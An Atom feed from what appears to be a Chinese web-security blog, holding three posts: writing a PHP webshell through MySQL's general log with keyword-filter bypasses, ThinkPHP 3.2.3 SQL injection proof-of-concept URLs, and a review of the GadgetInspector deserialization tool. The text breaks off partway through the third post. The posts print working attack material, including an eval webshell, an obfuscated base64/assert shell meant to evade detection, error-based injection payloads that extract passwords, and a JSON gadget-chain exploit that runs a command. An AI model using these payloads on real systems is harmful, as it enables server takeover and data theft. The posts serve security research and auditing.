<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  <subtitle>Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mi1k7ea.com/"/>
  <updated>2020-07-19T09:58:41.408Z</updated>
  <id>https://www.mi1k7ea.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL语句利用日志写shell及相关绕过</title>
    <link href="https://www.mi1k7ea.com/2020/07/19/SQL%E8%AF%AD%E5%8F%A5%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E5%86%99shell%E5%8F%8A%E7%9B%B8%E5%85%B3%E7%BB%95%E8%BF%87/"/>
    <id>https://www.mi1k7ea.com/2020/07/19/SQL语句利用日志写shell及相关绕过/</id>
    <published>2020-07-19T09:17:28.000Z</published>
    <updated>2020-07-19T09:58:41.408Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本原理"><a href="#0x01-基本原理" class="headerlink" title="0x01 基本原理"></a>0x01 基本原理</h2><p>在能够写SQL语句的地方，outfile、dumpfile、drop database等都被禁止，一般进行SQL注入来getshell或删库的方式行不通了。</p><p>但是如果MySQL是root用户启动的，那么可以进行如下利用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;  <span class="comment">#查看配置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;  <span class="comment">#开启general log模式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">'/var/www/html/1.php'</span>;   <span class="comment">#设置日志目录为shell地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[cmd]);?&gt;'</span>  <span class="comment">#写入shell</span></span><br></pre></td></tr></table></figure><p>SQL查询免杀shell的语句（参考：<a href="https://evi1cg.me/archives/test1.html" target="_blank" rel="noopener">SQL语句利用日志写shell</a>）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">"&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?&gt;"</span></span><br></pre></td></tr></table></figure><h2 id="0x02-Bypass案例"><a href="#0x02-Bypass案例" class="headerlink" title="0x02 Bypass案例"></a>0x02 Bypass案例</h2><p>这个案例虽然鸡肋，但是思路还可以。</p><h3 id="过滤-php"><a href="#过滤-php" class="headerlink" title="过滤 .php"></a>过滤 .php</h3><p>代码审计某CMS时，看到一处写SQL语句的地方，此处之前报过漏洞，修复方案是过滤了outfile、dumpfile、drop database等，此外还过滤了<code>.php</code>字符串，为的就是防住SQL语句日志写shell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'outfile'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “outfile”！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'dumpfile'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “dumpfile”！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'.php'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “.php” ！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/^drop(.*)database/i"</span>, $sql))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 不允许删除数据库！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里直接写上述的SQL语句肯定是不行的，因为<code>set global general_log_file = &#39;/var/www/html/1.php&#39;;</code>的<code>.php</code>会被过滤掉。</p><p>这里只是针对字符串的检测，可以用字符串拼接的方式Bypass，这里可以使用SQL语句中的concat家族系列函数来实现字符串拼接来Bypass：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;   <span class="comment">#查看配置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;        <span class="comment">#开启general log模式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file =<span class="keyword">CONCAT</span>(<span class="string">"/var/www/html/1."</span>,<span class="string">"php"</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[cmd]);?&gt;'</span>;   <span class="comment">#写入shell</span></span><br></pre></td></tr></table></figure><h3 id="过滤-php和concat"><a href="#过滤-php和concat" class="headerlink" title="过滤 .php和concat"></a>过滤 .php和concat</h3><p>在这次报过的漏洞之后，CMS厂商修改了这个洞，就是添加了对concat的字符串过滤，这样concat家族系列函数就使不上了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'outfile'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “outfile”！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'dumpfile'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “dumpfile”！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'.php'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “.php” ！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'concat'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “concat” ！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/^drop(.*)database/i"</span>, $sql))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 不允许删除数据库！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用concat进行字符串拼接的方式没法绕过了，但是除了字符串拼接，我们还能使用字符串替换的操作来绕过：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;   <span class="comment">#查看配置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;        <span class="comment">#开启general log模式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file =<span class="keyword">REPLACE</span>(<span class="string">"/var/www/html/1.jpg"</span>,<span class="string">"jpg"</span>,<span class="string">"php"</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[cmd]);?&gt;'</span>;   <span class="comment">#写入shell</span></span><br></pre></td></tr></table></figure><h3 id="过滤-php、concat和replace"><a href="#过滤-php、concat和replace" class="headerlink" title="过滤 .php、concat和replace"></a>过滤 .php、concat和replace</h3><p>CMS厂商收到新的绕过漏洞报告后，又进行新一轮的修复，过滤了replace：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'outfile'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “outfile”！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'dumpfile'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “dumpfile”！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'.php'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “.php” ！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($sql, <span class="string">'concat'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “concat” ！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stripos($sql, <span class="string">'replace'</span>))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 检测到非法字符 “replace” ！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/^drop(.*)database/i"</span>, $sql))&#123;</span><br><span class="line">    $str = <span class="string">'&lt;span class="c-red"&gt;ERROR : 不允许删除数据库！&lt;/span&gt;'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符串拼接和替换都不能成功进行利用了，还有啥办法不？</p><p>当然还有新的Bypass方法哈哈。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="SQL注入" scheme="https://www.mi1k7ea.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP V3.2.3 SQL注入总结</title>
    <link href="https://www.mi1k7ea.com/2020/06/14/ThinkPHP-V3-2-3-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/06/14/ThinkPHP-V3-2-3-SQL注入总结/</id>
    <published>2020-06-14T15:16:10.000Z</published>
    <updated>2020-06-14T15:17:22.260Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-find"><a href="#0x01-find" class="headerlink" title="0x01 find()"></a>0x01 find()</h2><p>漏洞代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = M(<span class="string">'users'</span>)-&gt;find(I(<span class="string">'GET.id'</span>));</span><br><span class="line">    var_dump($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)#</span><br></pre></td></tr></table></figure><h2 id="0x02-select"><a href="#0x02-select" class="headerlink" title="0x02 select()"></a>0x02 select()</h2><p>漏洞代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id = i(<span class="string">'id'</span>);</span><br><span class="line">    $res = M(<span class="string">'user'</span>)-&gt;select($id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC，有很多地方可注，这里主要列举三个<code>table</code>，<code>alias</code>，<code>where</code>，更多还请自行跟踪一下<code>parseSql</code>的各个<code>parseXXX</code>方法，目测都是可行的，比如<code>having</code>,<code>group</code>等：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">table：http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line">alias：http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line">where: http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br></pre></td></tr></table></figure><h2 id="0x03-delete"><a href="#0x03-delete" class="headerlink" title="0x03 delete()"></a>0x03 delete()</h2><p>漏洞代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id = i(<span class="string">'id'</span>);</span><br><span class="line">    $res = M(<span class="string">'user'</span>)-&gt;delete($id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC，同上，这里粗略举三个例子，<code>table</code>,<code>alias</code>,<code>where</code>，但使用<code>table</code>和<code>alias</code>的时候，同时还必须保证<code>where</code>不为空：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">where: http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line">alias: http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line">table: http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&amp;id[where]=1</span><br></pre></td></tr></table></figure><h2 id="0x04-where"><a href="#0x04-where" class="headerlink" title="0x04 where()"></a>0x04 where()</h2><p>漏洞代码1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $User = D(<span class="string">'Users'</span>);</span><br><span class="line">    $map = <span class="keyword">array</span>(<span class="string">'id'</span> =&gt; $_GET[<span class="string">'id'</span>]);</span><br><span class="line">    $user = $User-&gt;where($map)-&gt;find();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id[0]=exp&amp;id[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure><p>漏洞代码2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $User = M(<span class="string">"User"</span>);</span><br><span class="line">    $user[<span class="string">'id'</span>] = I(<span class="string">'id'</span>);</span><br><span class="line">    $data[<span class="string">'password'</span>] = I(<span class="string">'password'</span>);</span><br><span class="line">    $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">    var_dump($valu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[0]=bind&amp;id[1]=0%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password=1</span><br></pre></td></tr></table></figure><h2 id="0x05-order"><a href="#0x05-order" class="headerlink" title="0x05 order()"></a>0x05 order()</h2><p>漏洞代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $User = M(<span class="string">"User"</span>);</span><br><span class="line">    $order_by = I(<span class="string">'get.order'</span>);</span><br><span class="line">    $q = $User-&gt;where(<span class="string">'id'</span>,<span class="string">'1'</span>)-&gt;order($order_by)-&gt;find();</span><br><span class="line">    var_dump($q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order[updatexml(1,concat(0x3a,user()),1)]</span><br></pre></td></tr></table></figure><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=55066&amp;fromuid=140579" target="_blank" rel="noopener">thinkphp3.2.3 注入漏洞总结</a></p><p><a href="https://xz.aliyun.com/t/2629" target="_blank" rel="noopener">ThinkPHP3.2 框架sql注入漏洞分析(2018-08-23)</a></p><p><a href="https://www.anquanke.com/post/id/104847" target="_blank" rel="noopener">Thinkphp3.2.3最新版update注入漏洞</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>浅析反序列化利用链自动化挖掘工具GadgetInspector</title>
    <link href="https://www.mi1k7ea.com/2020/05/11/%E6%B5%85%E6%9E%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7GadgetInspector/"/>
    <id>https://www.mi1k7ea.com/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/</id>
    <published>2020-05-11T14:45:22.000Z</published>
    <updated>2020-05-14T15:51:54.378Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-工具地址"><a href="#0x00-工具地址" class="headerlink" title="0x00 工具地址"></a>0x00 工具地址</h2><p><a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">https://github.com/JackOfMostTrades/gadgetinspector</a></p><h2 id="0x01-BlackHat议题解读"><a href="#0x01-BlackHat议题解读" class="headerlink" title="0x01 BlackHat议题解读"></a>0x01 BlackHat议题解读</h2><p>下面按照BlackHat 2018中的演讲PPT展开介绍。</p><h3 id="反序列化漏洞及利用工具概述"><a href="#反序列化漏洞及利用工具概述" class="headerlink" title="反序列化漏洞及利用工具概述"></a>反序列化漏洞及利用工具概述</h3><p>作者先介绍了什么是反序列化漏洞，其中提到了反序列化漏洞之所以危害那么大是因为反序列化器会自动调用魔法函数。</p><p>魔法函数包括主要的readObject()和readResolve()，当然还有finalize()。除此之外，还有那些实现了这些魔法函数并调用了其他方法的可序列化的JDK类，归纳来说如下：</p><ul><li>Object.readObject()</li><li>Object.readResolve()</li><li>Object.finalize()</li><li>HashMap<ul><li>Object.hashCode()</li><li>Object.equals()</li></ul></li><li>PriorityQueue<ul><li>Comparator.compare()</li><li>Comparable.compareTo()</li></ul></li></ul><p>如下图从hashCode()这个魔术方法看整条利用链：</p><p><img src="/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/1.png" alt=""></p><p>这里readObject()函数中是调用了hashCode()函数；看到AbstractTableModel$ff19274a类的hashCode()函数实现是由调用IFn接口类的invoke()函数的；再看到实现IFn接口类的FnCompose类，其中自己实现的invoke()函数中分别调用了两个IFn类型的成员变量的invoke()函数，其中包括FnEval类的invoke()函数，这个方法中就是执行系统命令的Runtime.exec()。</p><p>所以直接构造如下Exp即可成功触发反序列化漏洞：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"@class"</span>: <span class="string">"java.util.HashMap"</span></span><br><span class="line">    <span class="string">"members"</span>: [</span><br><span class="line">        <span class="number">2</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"@class"</span>: <span class="string">"AbstractTableModel$ff19274a"</span></span><br><span class="line">            __clojureFnMap: &#123;</span><br><span class="line">                hashCode: &#123;</span><br><span class="line">                    "@class": "FnCompose"</span><br><span class="line">                    f2: &#123; "@class": "FnConstant", value: "/usr/bin/calc" &#125;,</span><br><span class="line">                    f1: &#123; "@class": "FnEval" &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"val"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哪些Java库是有漏洞的？作者列出了以下几种（当然现在就不止了）：</p><ul><li>JDK (ObjectInputStream)</li><li>XStream (XML, JSON)</li><li>Jackson (JSON)</li><li>Genson (JSON)</li><li>JSON-IO (JSON)</li><li>FlexSON (JSON)</li></ul><p>那么如何挖掘这种类型的漏洞呢？其实和挖掘应用安全问题一样：</p><ul><li>外部输入会传进漏洞出发点；</li><li>现有的静态和动态工具可以很好地辅助发现此类问题；</li></ul><p>已知的一些反序列化利用工具：</p><ul><li>ysoserial：通常仅限于特定库中的链，并侧重于JDK ObjectInputStream的攻击利用；</li><li>marshalsec：可供选择的反序列化库的利用范围更广；</li></ul><p>但是，如果我们使用的是非标准反序列化库或者classpath上一些特定组合的库时，上面的工具就无法进行攻击利用了。</p><p>现存的Gadget链工具：</p><ul><li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>：收集已知的Gadget链和Exp；</li><li><a href="https://github.com/Contrast-Security-OSS/joogle" target="_blank" rel="noopener">joogle</a>：以编程方式查询类路径上的类型/方法；</li><li><a href="https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/" target="_blank" rel="noopener">Java Deserialization Scanner</a>：BurpSuite插件，使用已知payload（ysoserial）来发现和利用漏洞；</li><li><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>：用于许多库和Gadget链的反序列化payload生成器；</li><li><a href="https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/" target="_blank" rel="noopener">NCC Group Burp Plugin</a>：“主要基于穆尼奥斯和米罗什的《星期五13：JSON攻击》”</li></ul><p>接着作者引出我们实际需要一个新工具，这个工具不需要自己生成payload，而是能够评估安全风险，即给定一个反序列化漏洞能否被攻击利用，有哪些利用方式比如RCE或DoS或SSRF。</p><p>因此，作者对该工具提出如下需求：</p><ul><li><p>不用于寻找漏洞，只在漏洞挖掘阶段使用此工具辅助发现问题；</p></li><li><p>它需要查看应用程序的整个classpath；</p></li><li><p>报错信息应该是误报而不是漏报；</p></li><li><p>它应该在字节码上操作；我们通常将整个classpath打包为一个war，并且可能没有源代码（特别是如果我们包括专有的第三方库）；</p></li><li><p>另外，它可能包括用Groovy、Scala、Clojure编写的库；</p></li></ul><h3 id="Gadget-Inspector"><a href="#Gadget-Inspector" class="headerlink" title="Gadget Inspector"></a>Gadget Inspector</h3><p>Gadget Inspector是一个为辅助挖掘Gadget链而生的Java字节码分析工具。</p><p>具有以下特点：</p><ul><li><p>在任意给定的classpath上操作，即特定的库或整个war包；</p></li><li><p>将发现的Gadget链作为方法调用序列进行报告；</p></li><li><p>执行一些简单的符号执行，以理解从方法参数到后续方法调用的可能数据流；</p></li><li><p>简化了许多假设，使代码分析更容易；</p></li></ul><p><img src="/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/2.png" alt=""></p><h4 id="原理步骤"><a href="#原理步骤" class="headerlink" title="原理步骤"></a>原理步骤</h4><h5 id="Step1-枚举类-方法的层次结构"><a href="#Step1-枚举类-方法的层次结构" class="headerlink" title="Step1.枚举类/方法的层次结构"></a>Step1.枚举类/方法的层次结构</h5><p><img src="/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/3.png" alt=""></p><h5 id="Step2-发现“透传”数据流"><a href="#Step2-发现“透传”数据流" class="headerlink" title="Step2.发现“透传”数据流"></a>Step2.发现“透传”数据流</h5><p><img src="/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/4.png" alt=""></p><h5 id="Step3-枚举“透传”调用图"><a href="#Step3-枚举“透传”调用图" class="headerlink" title="Step3.枚举“透传”调用图"></a>Step3.枚举“透传”调用图</h5><p><img src="/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/5.png" alt=""></p><h5 id="Step4-枚举使用已知Tricks的Sources"><a href="#Step4-枚举使用已知Tricks的Sources" class="headerlink" 